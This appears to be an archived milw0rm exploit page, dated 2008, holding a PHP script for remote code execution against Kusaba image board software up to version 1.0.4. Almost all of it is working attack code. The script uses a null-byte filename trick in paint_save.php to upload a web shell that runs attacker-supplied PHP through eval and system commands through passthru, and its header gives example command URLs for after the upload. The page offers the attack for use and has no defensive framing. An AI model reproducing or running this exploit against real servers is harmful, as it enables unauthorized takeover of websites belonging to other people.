<html><head><title>Kusaba <= 1.0.4 Remote Code Execution Exploit</title></head><pre>&lt;?php

/**********************************
9 Oct 2008
Kusaba &lt;= 1.0.4 Remote Code Execution
Sausage &lt;tehsausage@gmail.com&gt;

After execution:
http://www.kusaba.image.board/url/kasubaoek/oekaki.php?pc=print &quot;Hello&quot;;
http://www.kusaba.image.board/url/kasubaoek/oekaki.php?sc=echo Hello
**********************************/

$shellname = 'oekaki.php'; // any filename ending in php
$server = 'http://www.kusaba.image.board/url/'; // BBS website, with
trailing slash
$image = file_get_contents('test.jpg'); // image to upload (any valid
picture)
$magicquotes = true;

if ($magicquotes)
{
	$shellcode = &lt;&lt;&lt;endSHELL
&lt;?php
isset(\$_GET['pc'])?(eval(urldecode(stripslashes(\$_GET['pc'])))):(isset(\$_GET['sc'])?(passthru(urldecode(stripslashes(\$_GET['sc'])))):(header('Location:
../')));
endSHELL;
}
else
{
	$shellcode = &lt;&lt;&lt;endSHELL
&lt;?php 
isset(\$_GET['pc'])?(eval(urldecode(\$_GET['pc']))):(isset(\$_GET['sc'])?(passthru(urldecode(\$_GET['sc']))):(header('Location:
../')));
endSHELL;
}

$adata = array(
	'No clue' =&gt; 'what this is for',
);

function build_data($adata)
{
	$data = '';
	foreach ($adata as $k =&gt; $v)
	{
		$data .= &quot;$k=$v;&quot;;
	}
	return substr($data,0,-1);
}

function data_len($data)
{
	return str_pad(strlen($data),8,'0',STR_PAD_LEFT);
}

$request = new
HttpRequest($server.'paint_save.php?applet=shipainter&amp;saveid='.$shellname.'%00',HttpRequest::METH_POST);
$data = build_data($adata);
$imagedata = $image;
$animationdata = $shellcode;
$request-&gt;setRawPostData(&quot;S&quot;.data_len($data).$data.data_len($imagedata).'xx'.$imagedata.data_len($animationdata).$animationdata);

echo $request-&gt;send()-&gt;getBody();

# milw0rm.com [2008-10-09]</pre></html>